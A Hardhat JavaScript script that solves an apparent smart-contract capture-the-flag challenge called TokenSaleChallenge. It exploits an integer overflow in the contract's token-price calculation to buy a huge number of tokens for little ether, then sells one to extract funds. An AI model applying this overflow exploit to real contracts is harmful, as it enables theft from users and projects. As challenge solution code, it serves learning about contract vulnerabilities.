require("@nomiclabs/hardhat-ethers");
const { ethers } = require("ethers");
const hre = require("hardhat");

async function main() {
    const accounts = await hre.ethers.getSigners();
    eoa = accounts[0];

    const factory =  await hre.ethers.getContractFactory("TokenSaleChallenge")
    // contract address after pushing the deploy button in the challenge.
    contract = await factory.attach("0x4E6A0E3470E74fDAC94Bc3cc7B9eC96202F74037");
    console.log("Contract TokenSaleChallenge attached with address: ", contract.address)

    max_uint = ethers.constants.MaxUint256
    console.log(max_uint.toString())
    const num_of_tokens = max_uint.div(ethers.constants.WeiPerEther).add(1);
    console.log(num_of_tokens.toString());

    // overflow value = number - max_uint - 1;
    const _wei_for_buy = num_of_tokens.mul(ethers.constants.WeiPerEther).sub(max_uint).sub(1);
    console.log(_wei_for_buy.toString())
    // const wei_needed = ethers.BigNumber.from(415992086870360064);
    console.log('Buying tokens with ', _wei_for_buy.toString(), 'weis')
    await contract.buy(num_of_tokens, {value: _wei_for_buy, gasPrice: ethers.utils.parseUnits('15','gwei')});
    console.log("Current tokens balance of the buyer", await contract.balanceOf(eoa.address))

    await contract.sell(1, {gasPrice: ethers.utils.parseUnits('15','gwei')})
    
    console.log("Current tokens balance of the buyer", await contract.balanceOf(eoa.address))

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
